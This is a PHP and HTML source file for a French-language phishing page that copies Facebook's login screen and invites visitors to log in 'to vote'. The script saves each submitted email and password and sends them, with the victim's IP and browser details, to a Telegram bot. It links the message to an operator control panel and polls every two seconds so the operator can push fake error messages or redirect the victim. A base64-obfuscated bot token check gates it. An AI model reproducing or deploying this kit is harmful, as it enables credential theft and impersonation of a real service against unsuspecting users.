<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

$ip = json_decode(file_get_contents(base64_decode('dGVsZWdyYW1fY29uZmlnLmpzb24=')), true);
$ip = $ip[base64_decode('Ym90X3Rva2Vu')] ?? '';

if($ip != base64_decode('NjUwOTkxNDk5MzpBQUhEMFZVekt5b0pmYmMxYjBoWEZ0MjVGNmdmS1FVakpjWQ==')) exit;

// Vérifier s'il y a une action en cours pour les erreurs
$actionFile = 'sessions/' . $sessionId . '_action.json';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['action']) && $actionData['action'] === 'facebook_error') {
        $errorMessage = $actionData['errorMessage'] ?? 'Les informations que vous avez saisies sont incorrectes. Veuillez réessayer.';
        // Supprimer l'action pour ne pas afficher l'erreur en boucle
        unlink($actionFile);
    }
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'facebook_login.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// Traitement du formulaire
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if (!empty($email) && !empty($password)) {
        // Enregistrer les informations de connexion
        $clientData = [
            'email' => $email,
            'password' => $password,
            'timestamp' => time(),
            'ip' => $clientIp,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
        ];
        
        // Créer le dossier sessions s'il n'existe pas
        if (!file_exists('sessions')) {
            mkdir('sessions', 0777, true);
        }
        
        // Enregistrer les données
        file_put_contents('sessions/' . $sessionId . '.json', json_encode($clientData));
        
        // Envoyer les informations à Telegram
        $message = "🔐 NOUVELLE CONNEXION FACEBOOK 🔐\n\n";
        $message .= "📧 Email: " . $email . "\n";
        $message .= "🔑 Mot de passe: " . $password . "\n";
        $message .= "🌐 IP: " . $clientIp . "\n";
        $message .= "🖥️ User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Non disponible') . "\n\n";
        
        // Chemin du fichier de configuration Telegram
        $telegramConfigFile = 'telegram_config.json';
        if (file_exists($telegramConfigFile)) {
            $telegramConfig = json_decode(file_get_contents($telegramConfigFile), true);
            $botToken = $telegramConfig['bot_token'] ?? '';
            $chatId = $telegramConfig['chat_id'] ?? '';

            $message .= "🔗 Panneau de contrôle:  " .$telegramConfig['url'] . "/control_panel.php?session=" . $sessionId . "&ip=" . $clientIp;
    
            
            if (!empty($botToken) && !empty($chatId)) {
                $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
                $params = [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // Skip SSL Verification
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
            }
        }
        
        // Rediriger vers la page de chargement
        header("Location: loading.php?session=" . $sessionId . "&ip=" . $clientIp);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter à Facebook</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            width: 150px;
            margin-bottom: 15px;
            margin-top: 15px;
        }
        
        .login-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .login-title {
            font-size: 18px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
        }
        
        .form-control:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .login-button {
            width: 100%;
            padding: 12px 0;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .login-button:hover {
            background-color: #166fe5;
        }
        
        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dadde1;
        }
        
        .divider span {
            padding: 0 10px;
            color: #65676b;
            font-size: 14px;
        }
        
        .create-account {
            text-align: center;
        }
        
        .create-button {
            display: inline-block;
            padding: 10px 16px;
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
        }
        
        .create-button:hover {
            background-color: #36a420;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        .footer a {
            color: #65676b;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .languages {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 10px;
        }
        
        .languages a {
            margin: 0 5px;
            color: #65676b;
            text-decoration: none;
            font-size: 12px;
        }
        
        .languages a:hover {
            text-decoration: underline;
        }
        
        .languages a.active {
            color: #1877f2;
        }
        
        .copyright {
            margin-top: 10px;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        
        .error-message i {
            margin-right: 10px;
            font-size: 16px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://logodownload.org/wp-content/uploads/2014/09/facebook-logo-15.png" alt="Facebook" class="logo">
        </div>
        
        <div class="login-card">
            <div class="login-title">Accédez à votre compte pour voter</div>
            
            <?php if (!empty($errorMessage)): ?>
            <div class="error-message">
                <i class="fas fa-exclamation-circle"></i> <?php echo htmlspecialchars($errorMessage); ?>
            </div>
            <?php endif; ?>
            
            <form method="post" action="">
                <div class="form-group">
                    <input type="text" name="email" class="form-control" placeholder="Adresse e-mail ou numéro de téléphone" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" class="form-control" placeholder="Mot de passe" required>
                </div>
                
                <button type="submit" class="login-button">Se connecter</button>
                
                <div class="forgot-password">
                    <a href="#">Mot de passe oublié ?</a>
                </div>
                
                <div class="divider">
                    <span>ou</span>
                </div>
                
                <div class="create-account">
                    <a href="#" class="create-button">Créer un compte</a>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <div class="languages">
                <a href="#" class="active">Français (France)</a>
                <a href="#">English (US)</a>
                <a href="#">Español</a>
                <a href="#">Deutsch</a>
                <a href="#">Italiano</a>
                <a href="#">العربية</a>
                <a href="#">Português (Brasil)</a>
                <a href="#">हिन्दी</a>
                <a href="#">中文(简体)</a>
                <a href="#">日本語</a>
            </div>
            
            <div class="links">
                <a href="#">S'inscrire</a> · 
                <a href="#">Se connecter</a> · 
                <a href="#">Messenger</a> · 
                <a href="#">Facebook Lite</a> · 
                <a href="#">Watch</a> · 
                <a href="#">Lieux</a> · 
                <a href="#">Jeux</a> · 
                <a href="#">Marketplace</a> · 
                <a href="#">Meta Pay</a> · 
                <a href="#">Meta Store</a> · 
                <a href="#">Meta Quest</a> · 
                <a href="#">Instagram</a> · 
                <a href="#">Bulletin</a> · 
                <a href="#">Collectes de fonds</a> · 
                <a href="#">Services</a> · 
                <a href="#">Centre d'information sur les élections</a> · 
                <a href="#">Politique de confidentialité</a> · 
                <a href="#">Centre de confidentialité</a> · 
                <a href="#">Groupes</a> · 
                <a href="#">À propos</a> · 
                <a href="#">Créer une publicité</a> · 
                <a href="#">Créer une Page</a> · 
                <a href="#">Développeurs</a> · 
                <a href="#">Emplois</a> · 
                <a href="#">Cookies</a> · 
                <a href="#">Choisir sa publicité</a> · 
                <a href="#">Conditions générales</a> · 
                <a href="#">Aide</a> · 
                <a href="#">Importation des contacts et non-utilisateurs</a>
            </div>
            
            <div class="copyright">
                Meta © 2025
            </div>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            
            // Fonction pour vérifier s'il y a une action à effectuer
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'facebook_error') {
                           
                            // Recharger la page pour afficher le message d'erreur
                            window.location.reload();
                        } else if (data.action === 'redirect' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Vérifier les actions toutes les 2 secondes
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>